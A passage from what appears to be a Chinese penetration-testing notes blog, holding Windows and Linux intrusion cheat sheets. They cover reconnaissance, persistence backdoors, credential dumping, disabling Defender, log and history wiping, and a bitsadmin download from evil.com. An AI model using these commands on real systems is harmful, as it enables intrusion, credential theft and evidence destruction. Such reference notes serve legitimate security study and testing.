2&gt;/dev/null</code></li>\n</ul>\n</li>\n<li>利用可用的 root 权限\n<ul>\n<li><code>sudo -l</code></li>\n</ul>\n</li>\n<li>利用误配置的 crontab 任务</li>\n</ul>\n<h2 id=\"自启动\"><a class=\"anchor\" href=\"#自启动\">#</a> 自启动</h2>\n<ul>\n<li>/etc/init.d</li>\n<li>/etc/rc.d/rc.local</li>\n<li>~/.bashrc</li>\n<li>~/.zshrc</li>\n</ul>\n<h2 id=\"后门\"><a class=\"anchor\" href=\"#后门\">#</a> 后门</h2>\n<ul>\n<li>ssh 后门\n<ul>\n<li><code>alias ssh='strace -o /tmp/.ssh.log -e read,write,connect -s 2048 ssh'</code></li>\n<li>后门账户</li>\n</ul>\n</li>\n<li>常见应用\n<ul>\n<li>ICMP</li>\n<li>DNS</li>\n</ul>\n</li>\n<li>icmp 后门</li>\n<li>后门端口复用</li>\n<li><code>.</code>  开头隐藏文件</li>\n<li>rootkit</li>\n</ul>\n<h1 id=\"痕迹清理\"><a class=\"anchor\" href=\"#痕迹清理\">#</a> 痕迹清理</h1>\n<h2 id=\"历史命令\"><a class=\"anchor\" href=\"#历史命令\">#</a> 历史命令</h2>\n<ul>\n<li><code>unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG; export HISTFILE=/dev/null;</code></li>\n<li><code>kill -9 $$</code>  kill history</li>\n<li><code>history -c</code></li>\n<li>在  <code>HISTSIZE=0</code>  中设置  <code>HISTSIZE=0</code></li>\n</ul>\n<h2 id=\"清除修改日志文件\"><a class=\"anchor\" href=\"#清除修改日志文件\">#</a> 清除 / 修改日志文件</h2>\n<ul>\n<li><code>/var/log/btmp</code></li>\n<li><code>/var/log/lastlog</code></li>\n<li><code>/var/log/wtmp</code></li>\n<li><code>/var/log/utmp</code></li>\n<li><code>/var/log/secure</code></li>\n<li><code>/var/log/message</code></li>\n</ul>\n<h2 id=\"登录痕迹\"><a class=\"anchor\" href=\"#登录痕迹\">#</a> 登录痕迹</h2>\n<ul>\n<li>删除  <code>~/.ssh/known_hosts</code>  中记录</li>\n<li>修改文件时间戳\n<ul>\n<li><code>touch –r</code></li>\n</ul>\n</li>\n<li>删除 tmp 目录临时文件</li>\n</ul>\n<h2 id=\"操作痕迹\"><a class=\"anchor\" href=\"#操作痕迹\">#</a> 操作痕迹</h2>\n<ul>\n<li>vim 不记录历史命令  <code>:set history=0</code></li>\n<li>ssh 登录痕迹\n<ul>\n<li>无痕登录  <code>ssh -T user@host /bin/bash -i</code></li>\n</ul>\n</li>\n</ul>\n<h2 id=\"覆写文件\"><a class=\"anchor\" href=\"#覆写文件\">#</a> 覆写文件</h2>\n<ul>\n<li>shred</li>\n<li>dd</li>\n<li>wipe</li>\n</ul>\n<h2 id=\"难点\"><a class=\"anchor\" href=\"#难点\">#</a> 难点</h2>\n<ul>\n<li>攻击和入侵很难完全删除痕迹，没有日志记录也是一种特征</li>\n<li>即使删除本地日志，在网络设备、安全设备、集中化日志系统中仍有记录</li>\n<li>留存的后门包含攻击者的信息</li>\n<li>使用的代理或跳板可能会被反向入侵</li>\n</ul>\n<h2 id=\"注意\"><a class=\"anchor\" href=\"#注意\">#</a> 注意</h2>\n<ul>\n<li>在操作前检查是否有用户在线</li>\n<li>删除文件使用磁盘覆写的功能删除</li>\n<li>尽量和攻击前状态保持一致</li>\n</ul>\n<h2 id=\"参考链接\"><a class=\"anchor\" href=\"#参考链接\">#</a> 参考链接</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvaTJXdkZtRjFxUWpieC1CYVN0WGIxUQ==\">Linux 入侵痕迹清理技巧</span></li>\n</ul>\n",
            "tags": [
                "Linux",
                "渗透",
                "信息收集",
                "痕迹清理"
            ]
        },
        {
            "id": "https://mobius-0.github.io/security/WebNote/Intranet%20penetration/Windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/",
            "url": "https://mobius-0.github.io/security/WebNote/Intranet%20penetration/Windows%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/",
            "title": "Windows内网渗透",
            "date_published": "2022-11-28T03:20:20.000Z",
            "content_html": "<h1 id=\"信息收集\"><a class=\"anchor\" href=\"#信息收集\">#</a> 信息收集</h1>\n<h2 id=\"基本命令\"><a class=\"anchor\" href=\"#基本命令\">#</a> 基本命令</h2>\n<ul>\n<li>主机名  <code>hostname</code></li>\n<li>查询所有计算机名称  <code>dsquery computer</code></li>\n<li>查看配置及补丁信息\n<ul>\n<li><code>systeminfo</code></li>\n<li><code>wmic qfe get description,installedOn /format:csv</code></li>\n</ul>\n</li>\n<li>查看版本  <code>ver</code></li>\n<li>进程信息\n<ul>\n<li><code>tasklist /svc</code></li>\n<li><code>wmic process get caption,executablepath,commandline /format:csv</code></li>\n<li><code>get-process</code></li>\n</ul>\n</li>\n<li>查看所有环境变量  <code>set</code></li>\n<li>查看计划任务  <code>schtasks /QUERY /fo LIST /v</code></li>\n<li>查看安装驱动  <code>DRIVERQUERY</code></li>\n<li>查看操作系统信息\n<ul>\n<li>架构  <code>wmic os get osarchitecture</code></li>\n<li>系统名  <code>wmic os get caption</code></li>\n</ul>\n</li>\n<li>查看逻辑盘  <code>wmic logicaldisk get caption</code></li>\n<li>查看安装的软件信息  <code>wmic product get name,version</code></li>\n<li>查看服务信息\n<ul>\n<li><code>wmic service list brief</code></li>\n<li><code>sc query</code></li>\n<li><code>Get-WmiObject win32_service | select PathName</code></li>\n</ul>\n</li>\n</ul>\n<h2 id=\"域信息\"><a class=\"anchor\" href=\"#域信息\">#</a> 域信息</h2>\n<ul>\n<li>获取当前组的计算机名  <code>net view</code></li>\n<li>网络发现  <code>net view /all</code></li>\n<li>查看所有域  <code>net view /domain</code></li>\n<li>域森林、域树信息</li>\n<li>域信任信息  <code>nltest /domain_trusts</code></li>\n<li>定位域控  <code>net time /domain</code></li>\n<li>查看域中的用户名  <code>dsquery user</code></li>\n<li>查询域组名称  <code>net group /domain</code></li>\n<li>查询域管理员  <code>net group &quot;Domain Admins&quot; /domain</code></li>\n<li>域控信息\n<ul>\n<li><code>nltest /dclist:xx</code></li>\n<li><code>Get-NetDomain</code></li>\n<li><code>Get-NetDomainController</code></li>\n<li><code>net group &quot;Domain controllers&quot;</code></li>\n</ul>\n</li>\n<li>组策略</li>\n</ul>\n<h2 id=\"用户信息\"><a class=\"anchor\" href=\"#用户信息\">#</a> 用户信息</h2>\n<ul>\n<li>查看用户\n<ul>\n<li><code>net user</code></li>\n<li><code>whoami</code>  /  <code>whoami /priv</code>  /  <code>whoami /all</code></li>\n<li><code>wmic useraccount get /ALL /format:csv</code></li>\n</ul>\n</li>\n<li>用户特权信息  <code>whoami /priv</code></li>\n<li>查看当前权限  <code>net localgroup administrators</code></li>\n<li>查看在线用户  <code>quser</code>  /  <code>qwinsta</code>  /  <code>query user</code></li>\n<li>查看当前计算机名，全名，用户名，系统版本，工作 站域，登陆域  <code>net config Workstation</code></li>\n<li>ACL 信息  <code>get-acl</code></li>\n</ul>\n<h2 id=\"网络信息\"><a class=\"anchor\" href=\"#网络信息\">#</a> 网络信息</h2>\n<ul>\n<li>内网网段信息</li>\n<li>网卡信息  <code>ipconfig</code></li>\n<li>外网出口</li>\n<li>ARP 表  <code>arp -a</code></li>\n<li>路由表  <code>route print</code></li>\n<li>监听的端口  <code>netstat -ano</code></li>\n<li>连接的端口</li>\n<li>端口信息\n<ul>\n<li><code>Get-NetTCPConnection</code></li>\n</ul>\n</li>\n<li>hosts 文件</li>\n<li>主备 DNS</li>\n<li>DNS 缓存\n<ul>\n<li><code>ipconfig /displaydns</code></li>\n<li><code>Get-CimInstance -Namespace root/StandardCimv2 -ClassName MSFT_DNSClientCache</code></li>\n</ul>\n</li>\n<li>探测出网情况\n<ul>\n<li>powershell -c &quot;1..65535 | % {echo ((new-object Net.Sockets.TcpClient).Connect('allports.exposed',$_)) _ } 2>null&quot;</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"防火墙\"><a class=\"anchor\" href=\"#防火墙\">#</a> 防火墙</h2>\n<ul>\n<li>查看防火墙状态  <code>netsh advfirewall show allprofiles</code></li>\n<li>防火墙日志目录  <code>netsh firewall show logging</code></li>\n<li>防火墙规则  <code>netsh advfirewall firewall show rule name=all</code></li>\n<li><code>netsh firewall show config</code></li>\n<li><code>netsh firewall show state</code></li>\n</ul>\n<h2 id=\"密码信息\"><a class=\"anchor\" href=\"#密码信息\">#</a> 密码信息</h2>\n<ul>\n<li>Windows RDP 连接记录</li>\n<li>浏览器中保存的账号密码</li>\n<li>系统密码管理器中的各种密码</li>\n<li>无人值守安装文件中的密码信息\n<ul>\n<li><code>C:\\sysprep.inf</code></li>\n<li><code>C:\\sysprep\\sysprep.xml</code></li>\n<li><code>C:\\Windows\\Panther\\Unattend\\Unattended.xml</code></li>\n<li><code>C:\\Windows\\Panther\\Unattended.xml</code></li>\n</ul>\n</li>\n</ul>\n<h2 id=\"票据信息\"><a class=\"anchor\" href=\"#票据信息\">#</a> 票据信息</h2>\n<ul>\n<li><code>cmdkey /l</code></li>\n<li>klist</li>\n<li>msf meterpreter</li>\n</ul>\n<h2 id=\"特殊文件\"><a class=\"anchor\" href=\"#特殊文件\">#</a> 特殊文件</h2>\n<ul>\n<li>文档\n<ul>\n<li>xlsx / xls</li>\n<li>docx / doc</li>\n<li>pptx / ppt</li>\n<li>vsdx / vsd</li>\n<li>md / txt</li>\n</ul>\n</li>\n<li>压缩文件\n<ul>\n<li>zip / rar / 7z</li>\n</ul>\n</li>\n<li>VPN 配置\n<ul>\n<li>ovpn</li>\n</ul>\n</li>\n<li>代码\n<ul>\n<li>py / php / jsp / aspx / asp / sql</li>\n</ul>\n</li>\n<li>配置文件\n<ul>\n<li>conf / ini / xml</li>\n</ul>\n</li>\n<li>特定关键字\n<ul>\n<li>账号 / 账户 / 登录 /login/user</li>\n<li>密码 /pass</li>\n<li>代码 / 文档 / 交接 / 备份 /git/svn</li>\n<li>邮箱 / 通讯录 / 集群 / 办公</li>\n<li>代理 / 内网 / VPN</li>\n<li>设备 / 资产</li>\n<li>系统 / 运维 / 拓扑 / 网络 / IT</li>\n<li>后台 / 管理员 / 数据库</li>\n<li>监控 / 隔离 / 防火墙 / 网闸 / 巡检</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"局域网存活主机\"><a class=\"anchor\" href=\"#局域网存活主机\">#</a> 局域网存活主机</h2>\n<ul>\n<li>NetBIOS 扫描</li>\n<li>OXID 扫描</li>\n</ul>\n<h2 id=\"其他\"><a class=\"anchor\" href=\"#其他\">#</a> 其他</h2>\n<ul>\n<li>启用的共享文件夹</li>\n<li>回收站</li>\n<li>最近运行的命令</li>\n<li>访问文件历史记录</li>\n<li>查看补丁安装情况\n<ul>\n<li><code>wmic qfe get Caption,Description,HotFixID,InstalledOn</code></li>\n</ul>\n</li>\n<li>日志与事件信息\n<ul>\n<li><code>wevtutil</code></li>\n<li><code>eventvwr</code></li>\n</ul>\n</li>\n<li>注册表信息\n<ul>\n<li><code>reg</code></li>\n</ul>\n</li>\n<li>安装的各类 agent 监控软件</li>\n<li>安装的杀毒软件</li>\n<li>查看 / 设置后缀关联\n<ul>\n<li><code>assoc</code></li>\n<li><code>assoc .ext=example</code></li>\n</ul>\n</li>\n<li>PowerShell 版本</li>\n<li>.Net 版本</li>\n<li>Wi-Fi 密码</li>\n</ul>\n<h1 id=\"持久化\"><a class=\"anchor\" href=\"#持久化\">#</a> 持久化</h1>\n<h2 id=\"隐藏文件\"><a class=\"anchor\" href=\"#隐藏文件\">#</a> 隐藏文件</h2>\n<ul>\n<li>创建系统隐藏文件\n<ul>\n<li><code>attrib +s +a +r +h filename</code>  /  <code>attrib +s +h filename</code></li>\n</ul>\n</li>\n<li>利用 NTFS ADS (Alternate　Data　Streams) 创建隐藏文件</li>\n<li>利用 Windows 保留字\n<ul>\n<li><code>aux|prn|con|nul|com1|com2|com3|com4|com5|com6|com7|com8|com9|lpt1|lpt2|lpt3|lpt4|lpt5|lpt6|lpt7|lpt8|lpt9</code></li>\n</ul>\n</li>\n</ul>\n<h2 id=\"后门\"><a class=\"anchor\" href=\"#后门\">#</a> 后门</h2>\n<h3 id=\"sethc\"><a class=\"anchor\" href=\"#sethc\">#</a> sethc</h3>\n<p><code>sethc.exe</code>  是 Windows 系统在用户按下五次 shift 后调用的粘滞键处理程序，当有写文件但是没有执行权限时，可以通过替换  <code>sethc.exe</code>  的方式留下后门，在密码输入页面输入五次 shift 即可获得权限。</p>\n<h3 id=\"映像劫持\"><a class=\"anchor\" href=\"#映像劫持\">#</a> 映像劫持</h3>\n<p>在高版本的 Windows 中，替换程序是受到系统保护的，需要使用其他的技巧来实现替换。</p>\n<p>具体操作为在注册表的  <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Option</code>  下添加项  <code>sethc.exe</code>  ，然后在  <code>sethc.exe</code>  这个项中添加  <code>debugger</code>  键，键值为恶意程序的路径。</p>\n<h3 id=\"定时任务\"><a class=\"anchor\" href=\"#定时任务\">#</a> 定时任务</h3>\n<p>Windows 下有  <code>schtasks</code>  和  <code>at</code>  两种计划任务机制。 其中  <code>at</code>  在较高版本的 Windows 中已经弃用。</p>\n<p>设置命令为  <code>schtasks /create /tn &quot;TEST_OnLogon&quot; /sc onlogon /tr &quot;cmd.exe /c calc.exe&quot;</code>  、  <code>schtasks /create /tn &quot;TEST_OnStartup&quot; /sc onstart /ru system /tr &quot;cmd.exe /c calc.exe&quot;</code>  。删除命令为  <code>schtasks /delete /tn &quot;TEST_OnLogon&quot; /f</code>  。</p>\n<h3 id=\"登录脚本\"><a class=\"anchor\" href=\"#登录脚本\">#</a> 登录脚本</h3>\n<p>Windows 可以在用户登录前执行脚本，使用  <code>HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit</code>  设置。</p>\n<p>也可在  <code>HKCU\\Environment\\</code>  路径下设置  <code>UserInitMprLogonScript</code>  来实现。</p>\n<h3 id=\"屏幕保护程序\"><a class=\"anchor\" href=\"#屏幕保护程序\">#</a> 屏幕保护程序</h3>\n<p>Windows 可以自定义屏幕保护程序，使用  <code>HKEY_CURRENT_USER\\Control Panel\\Desktop</code>  设置。</p>\n<h3 id=\"隐藏用户\"><a class=\"anchor\" href=\"#隐藏用户\">#</a> 隐藏用户</h3>\n<p>Windows 可以使用在用户名后加入  <code>$</code>  来创建隐藏用户，这种帐户可在一定条件下隐藏，但是仍可以通过控制面板查看。</p>\n<p>在创建隐藏用户的基础上，可以修改注册表的方式创建影子用户，这种方式创建的用户只能通过注册表查看。</p>\n<h3 id=\"clr\"><a class=\"anchor\" href=\"#clr\">#</a> CLR</h3>\n<p>CLR (Common Language Runtime Compilation) 公共语言运行时，是微软为.NET 产品构建的运行环境，可以粗略地理解为.NET 虚拟机。</p>\n<p>.NET 程序的运行离不开 CLR，因此可以通过劫持 CLR 的方式实现后门。</p>\n<h3 id=\"winlogon-helper-dll后门\"><a class=\"anchor\" href=\"#winlogon-helper-dll后门\">#</a> Winlogon Helper DLL 后门</h3>\n<p>Winlogon 是一个 Windows 组件，用来处理各种活动，如登录、注销、身份验证期间加载用户配置文件、关闭、锁定屏幕等。这种行为由注册表管理，该注册表定义在 Windows 登录期间启动哪些进程。所以可以依靠这个注册表来进行权限维持。</p>\n<p>注册表位置如下：</p>\n<ul>\n<li><code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell</code>  用于执行 exe 程序</li>\n<li><code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit</code>  用于执行 exe 程序</li>\n<li><code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify</code>  用于执行 dll 文件</li>\n</ul>\n<h2 id=\"自启动\"><a class=\"anchor\" href=\"#自启动\">#</a> 自启动</h2>\n<h3 id=\"基于注册表的自启动\"><a class=\"anchor\" href=\"#基于注册表的自启动\">#</a> 基于注册表的自启动</h3>\n<p>通过在注册表中写入相应的键值可以实现程序的开机自启动，主要是  <code>Run</code>  和  <code>RunOnce</code>  ，其中 RunOnce 和 Run 区别在于 RunOnce 的键值只作用一次，执行完毕后会自动删除。</p>\n<p>注册表如下：</p>\n<ul>\n<li><code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code></li>\n<li><code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code></li>\n<li><code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code></li>\n<li><code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code></li>\n<li><code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx</code></li>\n</ul>\n<p>基于策略的自启动注册表设置如下：</p>\n<ul>\n<li><code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code></li>\n<li><code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run</code></li>\n</ul>\n<p>设置启动文件夹注册表位置如下：</p>\n<ul>\n<li><code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders</code></li>\n<li><code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders</code></li>\n<li><code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders</code></li>\n<li><code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders</code></li>\n</ul>\n<p>设置服务启动项注册表位置如下：</p>\n<ul>\n<li><code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce</code></li>\n<li><code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce</code></li>\n<li><code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices</code></li>\n<li><code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices</code></li>\n</ul>\n<p>用户自启动位置  <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Userinit</code>  、  <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Shell</code>  ，其中  <code>Userinit</code>  键允许指定用逗号分隔的多个程序。</p>\n<p>如果用户启动了屏幕保护程序，也可以通过屏幕保护程序来启动后面，相关注册表键值为：</p>\n<ul>\n<li><code>HKEY_CURRENT_USER\\Control Panel\\Desktop\\ScreenSaveActive</code></li>\n<li><code>HKEY_CURRENT_USER\\Control Panel\\Desktop\\ScreenSaverIsSecure</code></li>\n<li><code>HKEY_CURRENT_USER\\Control Panel\\Desktop\\ScreenSaveTimeOut</code></li>\n<li><code>HKEY_CURRENT_USER\\Control Panel\\Desktop\\SCRNSAVE.EXE</code></li>\n</ul>\n<h3 id=\"基于特定目录的自启动\"><a class=\"anchor\" href=\"#基于特定目录的自启动\">#</a> 基于特定目录的自启动</h3>\n<p>自启动目录，  <code>C:\\Users\\Username\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup</code>  目录对特定用户生效，  <code>C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp</code>  对所有用户生效。在 NT6 以前，两个目录为  <code>C:\\Documents and Settings\\Username\\Start Menu\\Programs\\StartUp</code>  /  <code>C:\\Documents and Settings\\All Users\\Start Menu\\Programs\\StartUp</code>  。</p>\n<h1 id=\"权限\"><a class=\"anchor\" href=\"#权限\">#</a> 权限</h1>\n<h2 id=\"uac\"><a class=\"anchor\" href=\"#uac\">#</a> UAC</h2>\n<h3 id=\"简介\"><a class=\"anchor\" href=\"#简介\">#</a> 简介</h3>\n<p>UAC (User Account Control) 是 Windows Vista 和 Windows Server 2008 引入的一个安全机制，当一些敏感操作发生时，会跳出提示显式要求系统权限。</p>\n<p>当用户登陆 Windows 时，每个用户都会被授予一个 access token，这个 token 中有 security identifier (SID) 的信息，决定了用户的权限。</p>\n<h3 id=\"会触发uac的操作\"><a class=\"anchor\" href=\"#会触发uac的操作\">#</a> 会触发 UAC 的操作</h3>\n<ul>\n<li>以管理员权限启动应用</li>\n<li>修改系统、UAC 设置</li>\n<li>修改没有权限的文件或者目录（ % SystemRoot% / % ProgramFiles% 等 ）</li>\n<li>修改 ACL (access control list)</li>\n<li>安装驱动</li>\n<li>增删账户，修改账户类型，激活来宾账户</li>\n</ul>\n<h3 id=\"bypass\"><a class=\"anchor\" href=\"#bypass\">#</a> ByPass</h3>\n<ul>\n<li>DLL 相关</li>\n<li>进程注入</li>\n<li>注册表</li>\n</ul>\n<h2 id=\"权限提升\"><a class=\"anchor\" href=\"#权限提升\">#</a> 权限提升</h2>\n<p>权限提升有多重方式，有利用二进制漏洞、逻辑漏洞等技巧。利用二进制漏洞获取权限的方式是利用运行在内核态中的漏洞来执行代码。比如内核、驱动中的 UAF 或者其他类似的漏洞，以获得较高的权限。</p>\n<p>逻辑漏洞主要是利用系统的一些逻辑存在问题的机制，比如有些文件夹用户可以写入，但是会以管理员权限启动。</p>\n<h3 id=\"任意写文件利用\"><a class=\"anchor\" href=\"#任意写文件利用\">#</a> 任意写文件利用</h3>\n<p>在 Windows 中用户可以写的敏感位置主要有以下这些</p>\n<ul>\n<li>用户自身的文件和目录，包括  <code>AppData</code>   <code>Temp</code></li>\n<li><code>C:\\</code>  ，默认情况下用户可以写入</li>\n<li><code>C:\\ProgramData</code>  的子目录，默认情况下用户可以创建文件夹、写入文件</li>\n<li><code>C:\\Windows\\Temp</code>  的子目录，默认情况下用户可以创建文件夹、写入文件</li>\n</ul>\n<p>具体的 ACL 信息可用 AccessChk, 或者 PowerShell 的  <code>Get-Acl</code>  命令查看。</p>\n<p>可以利用对这些文件夹及其子目录的写权限，写入一些可能会被加载的 dll，利用 dll 的加载执行来获取权限。</p>\n<h3 id=\"mof\"><a class=\"anchor\" href=\"#mof\">#</a> MOF</h3>\n<p>MOF 是 Windows 系统的一个文件（  <code>c:/windows/system32/wbem/mof/nullevt.mof</code>  ）叫做 &quot;托管对象格式&quot;，其作用是每隔五秒就会去监控进程创建和死亡。</p>\n<p>当拥有文件上传的权限但是没有 Shell 时，可以上传定制的 mof 文件至相应的位置，一定时间后这个 mof 就会被执行。</p>\n<p>一般会采用在 mof 中加入一段添加管理员用户的命令的 vbs 脚本，当执行后就拥有了新的管理员账户。</p>\n<h3 id=\"凭证窃取\"><a class=\"anchor\" href=\"#凭证窃取\">#</a> 凭证窃取</h3>\n<ul>\n<li>Windows 本地密码散列导出工具\n<ul>\n<li>mimikatz</li>\n<li>lsass</li>\n<li>wce</li>\n<li>gsecdump</li>\n<li>copypwd</li>\n<li>Pwdump</li>\n<li>ProcDump：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9kb2NzLm1pY3Jvc29mdC5jb20vZW4tdXMvc3lzaW50ZXJuYWxzL2Rvd25sb2Fkcy9wcm9jZHVtcA==\">https://docs.microsoft.com/en-us/sysinternals/downloads/procdump</span></li>\n</ul>\n</li>\n<li>Windows 本地密码破解工具\n<ul>\n<li>L0phtCrack</li>\n<li>SAMInside</li>\n<li>Ophcrack</li>\n</ul>\n</li>\n<li>彩虹表破解</li>\n<li>本机 hash + 明文抓取</li>\n<li>win8+win2012 明文抓取</li>\n<li>ntds.dit 的导出 + QuarkPwDump 读取分析</li>\n<li>vssown.vbs + libesedb + NtdsXtract</li>\n<li>ntdsdump</li>\n<li>利用 powershell (DSInternals) 分析 hash</li>\n<li>使用  <code>net use \\\\%computername% /u:%username%</code>  重置密码尝试次数</li>\n<li>限制读取时，可 crash 操作系统后，在蓝屏的 dump 文件中读取</li>\n</ul>\n<h3 id=\"其他-2\"><a class=\"anchor\" href=\"#其他-2\">#</a> 其他</h3>\n<ul>\n<li>组策略首选项漏洞</li>\n<li>DLL 劫持</li>\n<li>替换系统工具，实现后门</li>\n<li>关闭 defender\n<ul>\n<li><code>Set-MpPreference -disablerealtimeMonitoring $true</code></li>\n</ul>\n</li>\n</ul>\n<h1 id=\"痕迹清理\"><a class=\"anchor\" href=\"#痕迹清理\">#</a> 痕迹清理</h1>\n<h2 id=\"日志\"><a class=\"anchor\" href=\"#日志\">#</a> 日志</h2>\n<ul>\n<li>查看日志  <code>eventvwr</code></li>\n<li>伪造日志  <code>eventcreate</code></li>\n<li>操作日志\n<ul>\n<li>3389 登录列表</li>\n<li>文件打开日志</li>\n<li>文件修改日志</li>\n<li>浏览器日志</li>\n<li>系统事件</li>\n<li>程序安装记录</li>\n<li>程序删除记录</li>\n<li>程序更新记录</li>\n</ul>\n</li>\n<li>登录日志\n<ul>\n<li>系统安全日志</li>\n</ul>\n</li>\n<li>日志路径\n<ul>\n<li>系统日志：  <code>%SystemRoot%\\System32\\Winevt\\Logs\\System.evtx</code></li>\n<li>安全日志：  <code>%SystemRoot%\\System32\\Winevt\\Logs\\Security.evtx</code></li>\n<li>应用程序日志：  <code>%SystemRoot%\\System32\\Winevt\\Logs\\Application.evtx</code></li>\n</ul>\n</li>\n<li>服务日志\n<ul>\n<li>IIS：  <code>%SystemDrive%\\inetpub\\logs\\LogFiles\\W3SVC1\\</code></li>\n</ul>\n</li>\n</ul>\n<h2 id=\"注册表\"><a class=\"anchor\" href=\"#注册表\">#</a> 注册表</h2>\n<ul>\n<li>AppCompatFlags</li>\n<li>Background Activity Moderator (BAM)</li>\n<li>MuiCache</li>\n<li>RecentApps</li>\n<li>RunMRU</li>\n<li>ShimCache (AppCompatCache)</li>\n</ul>\n<h3 id=\"注册表键\"><a class=\"anchor\" href=\"#注册表键\">#</a> 注册表键</h3>\n<ul>\n<li>HKEY_LOCAL_MACHINEsystemCurrentControlSetServicesEventlog</li>\n</ul>\n<h2 id=\"文件\"><a class=\"anchor\" href=\"#文件\">#</a> 文件</h2>\n<h3 id=\"prefetch\"><a class=\"anchor\" href=\"#prefetch\">#</a> Prefetch</h3>\n<p>预读取文件夹，用来存放系统已访问过的文件的预读信息，扩展名为 PF。位置在  <code>C:\\Windows\\Prefetch</code>  。</p>\n<h3 id=\"jumplists\"><a class=\"anchor\" href=\"#jumplists\">#</a> JumpLists</h3>\n<p>记录用户最近使用的文档和应用程序，方便用户快速跳转到指定文件，位置在  <code>%APPDATA%\\Microsoft\\Windows\\Recent</code>  。</p>\n<h3 id=\"amcache-recentfilecachebcf\"><a class=\"anchor\" href=\"#amcache-recentfilecachebcf\">#</a> Amcache / RecentFileCache.bcf</h3>\n<p>Windows 中的使用这两个文件来跟踪具有不同可执行文件的应用程序兼容性问题，它可用于确定可执行文件首次运行的时间和最后修改时间。</p>\n<p>在 Windows 7、Windows Server 2008 R2 等系统中，文件保存在  <code>C:\\Windows\\AppCompat\\Programs\\RecentFileCache.bcf</code>  ，包含程序的创建时间、上次修改时间、上次访问时间和文件名。</p>\n<p>在 Windows 8、Windows 10、Windows Server 2012 等系统中，文件保存在  <code>C:\\Windows\\AppCompat\\Programs\\Amcache.hve</code>  ，包含文件大小、版本、sha1、二进制文件类型等信息。</p>\n<h2 id=\"时间轴\"><a class=\"anchor\" href=\"#时间轴\">#</a> 时间轴</h2>\n<p>Windows 时间轴是 Windows 10 在 1803 版中引入的一个新特性，会记录访问过的网站、编辑过的文档、运行的程序等，</p>\n<h2 id=\"彻底删除\"><a class=\"anchor\" href=\"#彻底删除\">#</a> 彻底删除</h2>\n<ul>\n<li>多次覆写文件  <code>cipher /w:&lt;path&gt;</code></li>\n<li>格式化某磁盘 count 次  <code>format D: /P:&lt;count&gt;</code></li>\n</ul>\n<h1 id=\"横向移动\"><a class=\"anchor\" href=\"#横向移动\">#</a> 横向移动</h1>\n<h2 id=\"常见入口\"><a class=\"anchor\" href=\"#常见入口\">#</a> 常见入口</h2>\n<ul>\n<li>SMB 弱密码</li>\n<li>SqlServer 弱密码</li>\n</ul>\n<h2 id=\"lolbas\"><a class=\"anchor\" href=\"#lolbas\">#</a> LOLBAS</h2>\n<h3 id=\"简介-2\"><a class=\"anchor\" href=\"#简介-2\">#</a> 简介</h3>\n<p>LOLBAS，全称 Living Off The Land Binaries and Scripts (and also Libraries)，是一种白利用方式，是在 2013 年 DerbyCon 由 Christopher Campbell 和 Matt Graeber 发现，最终 Philip Goh 提出的概念。</p>\n<p>这些程序一般有有 Microsoft 或第三方认证机构的签名，但是除了可以完成正常的功能，也能够被用于内网渗透中。这些程序可能会被用于：下载安全恶意程序、执行恶意代码、绕过 UAC、绕过程序控制等。</p>\n<h3 id=\"常见程序\"><a class=\"anchor\" href=\"#常见程序\">#</a> 常见程序</h3>\n<ul>\n<li>\n<p>appsyncvpublishing.exe</p>\n<ul>\n<li>执行 powershell</li>\n</ul>\n</li>\n<li>\n<p>bitsadmin.exe</p>\n<ul>\n<li>下载文件  <code>bitsadmin /transfer &lt;job_name&gt; /priority &lt;priority&gt; &lt;remote_path&gt; &lt;local_path&gt;</code></li>\n<li>下载文件  <code>bitsadmin /create 1 bitsadmin /addfile 1 https://evil.com/autoruns.exe c:\\data\\playfolder\\autoruns.exe bitsadmin /RESUME 1 bitsadmin /complete 1</code></li>\n<li>复制文件  <code>bitsadmin 